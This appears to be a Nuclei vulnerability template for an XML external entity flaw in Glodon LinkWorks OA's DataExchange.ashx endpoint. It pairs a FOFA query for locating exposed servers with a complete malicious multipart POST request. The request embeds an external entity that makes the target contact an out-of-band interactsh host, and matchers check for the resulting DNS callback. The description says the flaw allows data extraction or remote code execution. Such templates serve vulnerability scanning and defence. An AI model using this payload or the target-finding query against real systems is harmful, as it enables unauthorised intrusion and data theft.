id: glodon-linkworks-xxe
info:
  name: "广联达LinkWorks DataExchange.ashx接口XML外部实体注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
          广联达LinkWorks办公OA系统（Office Automation）为组织提供流程管理与文档协作解决方案。其/GB/LK/Document/DataExchange/DataExchange.ashx处理模块存在XML外部实体注入漏洞，攻击者可通过构造恶意XML实体实现敏感数据提取或远程代码执行。
  tags: 广联达
http:
- raw:
  - |
    POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryJGgV5l5ta05yAIe0
    Purpose: prefetch
    Sec-Purpose: prefetch;prerender

    ------WebKitFormBoundaryJGgV5l5ta05yAIe0
    Content-Disposition: form-data;name="SystemName"

    BIM
    ------WebKitFormBoundaryJGgV5l5ta05yAIe0
    Content-Disposition: form-data;name="Params"
    Content-Type: text/plain

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [
    <!ENTITY t SYSTEM "http://{{interactsh-url}}">
    ]
    >
    <test>&t;</test>
    ------WebKitFormBoundaryJGgV5l5ta05yAIe0--
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
